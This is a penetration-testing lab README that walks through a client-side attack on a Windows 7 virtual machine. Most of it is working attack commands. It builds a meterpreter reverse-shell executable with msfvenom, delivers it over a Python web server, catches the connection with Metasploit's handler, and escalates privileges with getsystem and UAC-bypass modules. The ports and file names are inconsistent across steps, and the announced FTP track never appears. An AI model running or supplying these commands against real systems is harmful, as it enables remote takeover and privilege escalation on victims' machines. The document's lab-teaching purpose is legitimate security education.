## lab work revolves around ethical penetration testing using the Cyber Kill Chain model, with two main practical tracks
```
    1. Windows-based client-side attack (via payload delivery and privilege escalation)
    2. Server-side FTP vulnerability exploitation (on Metasploitable Linux)
```
## 🔧 Prerequisites
```
Make sure you have:

    VirtualBox (or VMware)
    Kali Linux (attacker machine)
    Windows 7 VM (victim client) — for Track 1
    Metasploitable Linux 2 (vulnerable server) — for Track 2
    All VMs on the same network mode (Host-only or Bridged as needed)
```

## 🛠️ TRACK 1: Windows-based client-side attack (via payload delivery)
### Step 1: Set Up Vulnerable Windows 7 VM
```
Create a new VM in VirtualBox
Install Windows 7 using an ISO.
Disable Windows Defender:
```

### Step 2: Generate Malicious Payload

Get your Kali IP atfirst:

**Command** - 
```
ip a
```

**Command**: 
```
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<**kali_ip**> lport=4554 -f exe -o any_name.exe
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4554 -f exe -o hackme.exe


Here the payload generation is successful and saved as our given name myexploit.exe 

### Step 3: Host Payload for Delivery
### **Command**(N.B (Use port 8000 (or any port except 4554)): 
```
python3 -m http.server -b <your_machine_ip> <port_number>
```

**Example**- After that open browser from the victim machine and use the url you just started as server  http://192.168.0.7:8999 
### example - python3 -m http.server -b 192.168.56.102 4444 
### Now download the payload you have just created. 


# **System Exploitation & Gaining Access**

### Step 1: 
Go to new terminal and use the below command to start metasploit console 
**Command**:
```
msfconsole  
```
### Step 2: 
Use the Multi Handler mood in metasploit. 
**Command**: 
```
use exploit/multi/handler 
```
### Step 3: 
Set listening payload which is same as our msfvenom payload 
**Command**: 
```
set payload payload/windows/x64/meterpreter/reverse_tcp 
```
### Step 4: Now check the available options 
**Command**: 
```
show options
```
### Step 5: Local Host Setup 
Now set the LHOST (attacker machine IP or interface) where the victim 
machine will connect. 

**Command**:
```
set lhost 192.168.0.7 
```
### Step 6: now set the LHOST port (reverse connection port)  
**Command**: 
```
set lport 4444 
```
Then use,  
**Command**: 
```
exploit
```
### Step 7: now download the file and run it .(dont do it earlier)

### Step 8: Now we will check the system info and the privileges we have gained. 
**Command**: 
```
sysinfo 
```
**Command**: 
```
getsystem 
```

# Privilege Escalation

Now we will come back to our msfconsole terminal by typing command “background” in the meterpreter terminal. This command will store our access as a background session.  
**Command**:
```
background
```

We can view our session by using the 
**Command**: 
```
sessions
 ```
Now our target is to bypass User Access Control (UAC) to gain administrator access. To do so, follow the below steps. 
### Step : Using UAC bypass payload 
**Command**: 
```
use exploit/windows/local/bypassuac
```
### Step : Check the pending required option and active 
background sessions 
**Command**: 
```
sessions -i
```
### Step : Set Session 
We have found one active session is running in the background which Id is 1, now we will use this session to complete the 
privilege escalation by bypassing the UAC. And after setting up everything, we will execute attack by using “exploit” command. 
**Command**: 
```
set session 1 
```
### The bypassuac module starts its own handler and defaults LHOST to 127.0.0.1 if not specified. You must explicitly set LHOST to your Kali IP (the real attacker IP).
🔧 Step-by-Step Fix:

    1. Identify your Kali Linux IP (the one reachable by the Windows VM):
    
    ip a
  ### Example: 192.168.56.102  (likely same as your original handler)
   
    2. In the bypassuac module, set both SESSION and LHOST:
   
```
use exploit/windows/local/bypassuac
set session 1
set LHOST 192.168.56.102    # ← YOUR KALI IP, NOT 127.0.0.1
set LPORT 4445              # ← Use a NEW port to avoid conflict
```



    
**Command**:
```
exploit
```
### Step 12: Gained system access 
Now we have gained administrator access and successfully bypasses the User Access Control 
(UAC). To check this, type the previous command which we have used earlier to check the UAC. 
**Command**:
``` 
getsystem 
```
```

    💡 Why a new port (4445)?
    Your original handler is still running on port 1234 (or 4444). If you reuse the same port, the new payload may conflict or fail. Use a fresh port.

🛠️ Alternative: Use bypassuac_injection (More Reliable)

Some Windows 7 builds block file writes (which bypassuac uses). Try the in-memory version:
use exploit/windows/local/bypassuac_injection
set session 1
set LHOST 192.168.56.102
set LPORT 4445
exploit
```
